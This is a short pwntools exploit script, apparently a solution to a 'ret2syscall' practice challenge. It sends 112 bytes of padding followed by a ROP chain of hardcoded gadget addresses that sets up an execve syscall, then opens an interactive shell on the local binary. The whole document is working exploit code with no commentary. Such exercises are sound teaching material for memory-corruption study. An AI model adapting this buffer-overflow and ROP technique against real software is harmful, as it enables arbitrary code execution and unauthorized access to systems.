from pwn import *

addr1=0x080bb196
addr2=0x0806eb90
addr3=0x080be408
addr4=0x08049421
sh = process("./ret2syscall")
sh.recvline()
sh.recvline()
payload = ("A" * 112).encode() + p32(addr1) + p32(0xb) + p32(addr2) + p32(0x0) + p32(0x0) + p32(addr3) + p32(addr4)
sh.sendline(payload)
sh.interactive()
